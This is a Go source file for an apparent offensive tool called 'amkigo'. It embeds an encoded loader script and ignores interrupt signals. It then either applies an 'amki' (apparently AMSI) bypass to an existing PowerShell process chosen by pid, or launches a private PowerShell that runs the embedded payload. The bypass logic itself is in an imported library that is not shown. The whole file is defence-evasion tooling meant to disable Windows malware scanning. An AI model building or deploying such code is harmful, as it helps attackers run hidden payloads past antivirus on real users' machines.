package main

import (
	"amkigo/lib"
	_ "embed"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"syscall"
)

//go:embed loader.en
var dotCode string

func main() {
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		for {
			<-c
		}
	}()

	var pid int
	flag.IntVar(&pid, "pid", 0, "(default 0) bypass amki special Pshell with pid\nset pid = 0 to create private Pshell")
	flag.Parse()
	if pid > 0 {
		lib.Go(uint32(pid))
		return
	}

	fmt.Println(lib.StarPS(dotCode))
}
